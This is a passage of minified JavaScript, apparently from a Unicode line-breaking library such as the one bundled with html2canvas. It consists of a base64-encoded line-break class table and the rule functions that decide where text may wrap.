BQAFAAKwANAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAeAB4AUABQAFAAUABQAFAAUAArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArAFAAUAArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArAA0AUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwAeAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAUABQAFAAUABQAAQABAAEACsABAAEACsAKwArACsAKwAEAAQABAAEAFAAUABQAFAAKwBQAFAAUAArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArAAQABAAEACsAKwArACsABABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArAA0ADQANAA0ADQANAA0ADQAeACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAeAFAAUABQAFAAUABQAFAAUAAeAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAAQABAArACsAKwArAFAAUABQAFAAUAANAA0ADQANAA0ADQAUACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArACsADQANAA0ADQANAA0ADQBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArAB4AHgAeAB4AKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArAFAAUABQAFAAUABQAAQABAAEAAQAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUAArAAQABAANACsAKwBQAFAAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAAQABAAEAAQABAAEAAQABAAEAAQABABQAFAAUABQAB4AHgAeAB4AHgArACsAKwArACsAKwAEAAQABAAEAAQABAAEAA0ADQAeAB4AHgAeAB4AKwArACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsABABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAAQABAAEAAQABAAEAAQABAAEAAQABAAeAB4AHgANAA0ADQANACsAKwArACsAKwArACsAKwArACsAKwAeACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArACsAKwArACsAKwBLAEsASwBLAEsASwBLAEsASwBLACsAKwArACsAKwArAFAAUABQAFAAUABQAFAABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACsASwBLAEsASwBLAEsASwBLAEsASwANAA0ADQANAFAABAAEAFAAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAABAAeAA4AUAArACsAKwArACsAKwArACsAKwAEAFAAUABQAFAADQANAB4ADQAEAAQABAAEAB4ABAAEAEsASwBLAEsASwBLAEsASwBLAEsAUAAOAFAADQANAA0AKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAAQABAAEAAQABAANAA0AHgANAA0AHgAEACsAUABQAFAAUABQAFAAUAArAFAAKwBQAFAAUABQACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwBQAFAAUABQAFAAUABQAFAAUABQAA0AKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAAQABAAEAAQAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsABAAEAAQABAArAFAAUABQAFAAUABQAFAAUAArACsAUABQACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwBQAFAAUABQAFAAUABQACsAUABQACsAUABQAFAAUABQACsABAAEAFAABAAEAAQABAAEAAQABAArACsABAAEACsAKwAEAAQABAArACsAUAArACsAKwArACsAKwAEACsAKwArACsAKwBQAFAAUABQAFAABAAEACsAKwAEAAQABAAEAAQABAAEACsAKwArAAQABAAEAAQABAArACsAKwArACsAKwArACsAKwArACsABAAEAAQABAAEAAQABABQAFAAUABQAA0ADQANAA0AHgBLAEsASwBLAEsASwBLAEsASwBLAA0ADQArAB4ABABQAFAAUAArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwAEAAQABAAEAFAAUAAeAFAAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAABAAEAAQABAAEAAQABAArACsABAAEAAQABAAEAAQABAAEAAQADgANAA0AEwATAB4AHgAeAA0ADQANAA0ADQANAA0ADQANAA0ADQANAA0ADQANAFAAUABQAFAABAAEACsAKwAEAA0ADQAeAFAAKwArACsAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAFAAKwArACsAKwArACsAKwBLAEsASwBLAEsASwBLAEsASwBLACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAXABcAFwAXABcAFwAXABcAFwAXABcAFwAXABcAFwAXABcAFwAXABcAFwAXABcAFwAXABcAFwAKwArACoAKgAqACoAKgAqACoAKgAqACoAKgAqACoAKgAqACsAKwArACsASwBLAEsASwBLAEsASwBLAEsASwBcAFwADQANAA0AKgBQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAeACsAKwArACsASwBLAEsASwBLAEsASwBLAEsASwBQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAKwArAFAAKwArAFAAUABQAFAAUABQAFAAUAArAFAAUAArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAABAAEAAQABAAEAAQAKwAEAAQAKwArAAQABAAEAAQAUAAEAFAABAAEAA0ADQANACsAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAABAAEAAQABAAEAAQABAArACsABAAEAAQABAAEAAQABABQAA4AUAAEACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFAABAAEAAQABAAEAAQABAAEAAQABABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAFAABAAEAAQABAAOAB4ADQANAA0ADQAOAB4ABAArACsAKwArACsAKwArACsAUAAEAAQABAAEAAQABAAEAAQABAAEAAQAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAA0ADQANAFAADgAOAA4ADQANACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAUAArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAABAAEAAQABAAEAAQABAAEACsABAAEAAQABAAEAAQABAAEAFAADQANAA0ADQANACsAKwArACsAKwArACsAKwArACsASwBLAEsASwBLAEsASwBLAEsASwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwAOABMAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAArAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAArACsAKwArACsAKwArACsAKwBQAFAAUABQAFAAUABQACsAUABQACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAArACsAKwAEACsABAAEACsABAAEAAQABAAEAAQABABQAAQAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsAUABQAFAAUABQAFAAKwBQAFAAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQAKwAEAAQAKwAEAAQABAAEAAQAUAArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAABAAEAAQABAAeAB4AKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwBQACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAB4AHgAeAB4AHgAeAB4AHgAaABoAGgAaAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgArACsAKwArACsAKwArACsAKwArACsAKwArAA0AUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsADQANAA0ADQANACsAKwArACsAKwArACsAKwArACsAKwBQAFAAUABQACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAASABIAEgAQwBDAEMAUABQAFAAUABDAFAAUABQAEgAQwBIAEMAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAASABDAEMAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwAJAAkACQAJAAkACQAJABYAEQArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABIAEMAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwANAA0AKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArAAQABAAEAAQABAANACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEAA0ADQANAB4AHgAeAB4AHgAeAFAAUABQAFAADQAeACsAKwArACsAKwArACsAKwArACsASwBLAEsASwBLAEsASwBLAEsASwArAFAAUABQAFAAUABQAFAAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAANAA0AHgAeACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAKwArACsAKwAEAFAABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAKwArACsAKwArACsAKwAEAAQABAAEAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAARwBHABUARwAJACsAKwArACsAKwArACsAKwArACsAKwAEAAQAKwArACsAKwArACsAKwArACsAKwArACsAKwArAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXACsAKwArACsAKwArACsAKwBXAFcAVwBXAFcAVwBXAFcAVwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAUQBRAFEAKwArACsAKwArACsAKwArACsAKwArACsAKwBRAFEAUQBRACsAKwArACsAKwArACsAKwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUAArACsAHgAEAAQADQAEAAQABAAEACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgArACsAKwArACsAKwArACsAKwArAB4AHgAeAB4AHgAeAB4AKwArAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAAQABAAEAAQABAAeAB4AHgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAB4AHgAEAAQABAAEAAQABAAEAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4ABAAEAAQABAAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4ABAAEAAQAHgArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwArACsAKwArACsAKwArACsAKwArAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgArACsAKwArACsAKwArACsAKwAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgArAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AKwBQAFAAKwArAFAAKwArAFAAUAArACsAUABQAFAAUAArAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeACsAUAArAFAAUABQAFAAUABQAFAAKwAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AKwBQAFAAUABQACsAKwBQAFAAUABQAFAAUABQAFAAKwBQAFAAUABQAFAAUABQACsAHgAeAFAAUABQAFAAUAArAFAAKwArACsAUABQAFAAUABQAFAAUAArAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAHgBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgBQAFAAUABQAFAAUABQAFAAUABQAFAAHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAB4AHgAeAB4AHgAeAB4AHgAeACsAKwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAEsASwBLAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAeAB4AHgAeAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAeAB4AHgAeAB4AHgAeAB4ABAAeAB4AHgAeAB4AHgAeAB4AHgAeAAQAHgAeAA0ADQANAA0AHgArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwAEAAQABAAEAAQAKwAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAAQABAAEAAQABAAEAAQAKwAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAKwArAAQABAAEAAQABAAEAAQAKwAEAAQAKwAEAAQABAAEAAQAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwAEAAQABAAEAAQABAAEAFAAUABQAFAAUABQAFAAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwBQAB4AKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArABsAUABQAFAAUABQACsAKwBQAFAAUABQAFAAUABQAFAAUAAEAAQABAAEAAQABAAEACsAKwArACsAKwArACsAKwArAB4AHgAeAB4ABAAEAAQABAAEAAQABABQACsAKwArACsASwBLAEsASwBLAEsASwBLAEsASwArACsAKwArABYAFgArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAGgBQAFAAUAAaAFAAUABQAFAAKwArACsAKwArACsAKwArACsAKwArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAeAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQACsAKwBQAFAAUABQACsAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwBQAFAAKwBQACsAKwBQACsAUABQAFAAUABQAFAAUABQAFAAUAArAFAAUABQAFAAKwBQACsAUAArACsAKwArACsAKwBQACsAKwArACsAUAArAFAAKwBQACsAUABQAFAAKwBQAFAAKwBQACsAKwBQACsAUAArAFAAKwBQACsAUAArAFAAUAArAFAAKwArAFAAUABQAFAAKwBQAFAAUABQAFAAUABQACsAUABQAFAAUAArAFAAUABQAFAAKwBQACsAUABQAFAAUABQAFAAUABQAFAAUAArAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAArACsAKwArACsAUABQAFAAKwBQAFAAUABQAFAAKwBQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwAeAB4AKwArACsAKwArACsAKwArACsAKwArACsAKwArAE8ATwBPAE8ATwBPAE8ATwBPAE8ATwBPAE8AJQAlACUAHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHgAeAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB4AHgAeACUAJQAlAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAdAB0AHQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQApACkAKQApACkAKQApACkAKQApACkAKQApACkAKQApACkAKQApACkAKQApACkAKQApACkAJQAlACUAJQAlACAAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAeAB4AJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlAB4AHgAlACUAJQAlACUAHgAlACUAJQAlACUAIAAgACAAJQAlACAAJQAlACAAIAAgACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACEAIQAhACEAIQAlACUAIAAgACUAJQAgACAAIAAgACAAIAAgACAAIAAgACAAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJQAlACUAIAAlACUAJQAlACAAIAAgACUAIAAgACAAJQAlACUAJQAlACUAJQAgACUAIAAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAHgAlAB4AJQAeACUAJQAlACUAJQAgACUAJQAlACUAHgAlAB4AHgAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlAB4AHgAeAB4AHgAeAB4AJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAeAB4AHgAeAB4AHgAeAB4AHgAeACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACAAIAAlACUAJQAlACAAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACAAJQAlACUAJQAgACAAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAHgAeAB4AHgAeAB4AHgAeACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAeAB4AHgAeAB4AHgAlACUAJQAlACUAJQAlACAAIAAgACUAJQAlACAAIAAgACAAIAAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeABcAFwAXABUAFQAVAB4AHgAeAB4AJQAlACUAIAAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACAAIAAgACUAJQAlACUAJQAlACUAJQAlACAAJQAlACUAJQAlACUAJQAlACUAJQAlACAAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AJQAlACUAJQAlACUAJQAlACUAJQAlACUAHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AJQAlACUAJQAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeACUAJQAlACUAJQAlACUAJQAeAB4AHgAeAB4AHgAeAB4AHgAeACUAJQAlACUAJQAlAB4AHgAeAB4AHgAeAB4AHgAlACUAJQAlACUAJQAlACUAHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAgACUAJQAgACUAJQAlACUAJQAlACUAJQAgACAAIAAgACAAIAAgACAAJQAlACUAJQAlACUAIAAlACUAJQAlACUAJQAlACUAJQAgACAAIAAgACAAIAAgACAAIAAgACUAJQAgACAAIAAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAgACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACAAIAAlACAAIAAlACAAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAgACAAIAAlACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJQAlAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AKwAeAB4AHgAeAB4AHgAeAB4AHgAeAB4AHgArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAEsASwBLAEsASwBLAEsASwBLAEsAKwArACsAKwArACsAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAKwArAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXACUAJQBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwAlACUAJQAlACUAJQAlACUAJQAlACUAVwBXACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQBXAFcAVwBXAFcAVwBXAFcAVwBXAFcAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAJQAlACUAKwAEACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArAA=="),m=Array.isArray(A)?function(e){for(var t=e.length,n=[],r=0;r<t;r+=4)n.push(e[r+3]<<24|e[r+2]<<16|e[r+1]<<8|e[r]);return n}(A):new Uint32Array(A),g=b(v=Array.isArray(A)?function(e){for(var t=e.length,n=[],r=0;r<t;r+=2)n.push(e[r+1]<<8|e[r]);return n}(A):new Uint16Array(A),12,m[4]/2),y=2===m[5]?b(v,(24+m[4])/2):(p=m,h=Math.ceil((24+m[4])/4),p.slice?p.slice(h,f):new Uint32Array(Array.prototype.slice.call(p,h,f))),new _(m[0],m[1],m[2],m[3],g,y)),K=[N,36],q=[1,2,3,5],X=[w,8],Y=[L,F],J=q.concat(X),Z=[z,H,V,j,U],ee=[x,C],te=function(e,t,n,r){var i=r[n];if(Array.isArray(e)?-1!==e.indexOf(i):e===i)for(var a=n;a<=r.length;){if((l=r[++a])===t)return!0;if(l!==w)break}if(i===w)for(a=n;0<a;){var o=r[--a];if(Array.isArray(e)?-1!==e.indexOf(o):e===o)for(var s=n;s<=r.length;){var l;if((l=r[++s])===t)return!0;if(l!==w)break}if(o!==w)break}return!1},ne=function(e,t){for(var n=e;0<=n;){var r=t[n];if(r!==w)return r;n--}return 0},re=function(e,t,n,r,i){if(0===n[r])return"×";var a=r-1;if(Array.isArray(i)&&!0===i[a])return"×";var o=a-1,s=a+1,l=t[a],c=0<=o?t[o]:0,u=t[s];if(2===l&&3===u)return"×";if(-1!==q.indexOf(l))return"!";if(-1!==q.indexOf(u))return"×";if(-1!==X.indexOf(u))return"×";if(8===ne(a,t))return"÷";if(11===W.get(e[a]))return"×";if((l===D||l===R)&&11===W.get(e[s]))return"×";if(7===l||7===u)return"×";if(9===l)return"×";if(-1===[w,C,x].indexOf(l)&&9===u)return"×";if(-1!==[S,k,M,P,O].indexOf(u))return"×";if(ne(a,t)===T)return"×";if(te(23,T,a,t))return"×";if(te([S,k],E,a,t))return"×";if(te(12,12,a,t))return"×";if(l===w)return"÷";if(23===l||23===u)return"×";if(16===u||16===l)return"÷";if(-1!==[C,x,E].indexOf(u)||14===l)return"×";if(36===c&&-1!==ee.indexOf(l))return"×";if(l===O&&36===u)return"×";if(u===B)return"×";if(-1!==K.indexOf(u)&&l===I||-1!==K.indexOf(l)&&u===I)return"×";if(l===L&&-1!==[$,D,R].indexOf(u)||-1!==[$,D,R].indexOf(l)&&u===F)return"×";if(-1!==K.indexOf(l)&&-1!==Y.indexOf(u)||-1!==Y.indexOf(l)&&-1!==K.indexOf(u))return"×";if(-1!==[L,F].indexOf(l)&&(u===I||-1!==[T,x].indexOf(u)&&t[s+1]===I)||-1!==[T,x].indexOf(l)&&u===I||l===I&&-1!==[I,O,P].indexOf(u))return"×";if(-1!==[I,O,P,S,k].indexOf(u))for(var d=a;0<=d;){if((p=t[d])===I)return"×";if(-1===[O,P].indexOf(p))break;d--}if(-1!==[L,F].indexOf(u))for(d=-1!==[S,k].indexOf(l)?o:a;0<=d;){var p;if((p=t[d])===I)return"×";if(-1===[O,P].indexOf(p))break;d--}if(z===l&&-1!==[z,H,j,U].indexOf(u)||-1!==[H,j].indexOf(l)&&-1!==[H,V].indexOf(u)||-1!==[V,U].indexOf(l)&&u===V)return"×";if(-1!==Z.indexOf(l)&&-1!==[B,F].indexOf(u)||-1!==Z.indexOf(u)&&l===L)return"×";if(-1!==K.indexOf(l)&&-1!==K.indexOf(u))return"×";if(l===P&&-1!==K.indexOf(u))return"×";if(-1!==K.concat(I).indexOf(l)&&u===T&&-1===G.indexOf(e[s])||-1!==K.concat(I).indexOf(u)&&l===k)return"×";if(41===l&&41===u){for(var h=n[a],f=1;0<h&&41===t[--h];)f++;if(f%2!=0)return"×"}return l===D&&u===R?"×":"÷"},ie=function(){function e(e,t,n,r){this.codePoints=e,this.required="!"===t,this.start=n,this.end=r}return e.prototype.slice=function(){return l.apply(void 0,this.codePoints.slice(this.start,this.end))},e}(),ae=function(e){return 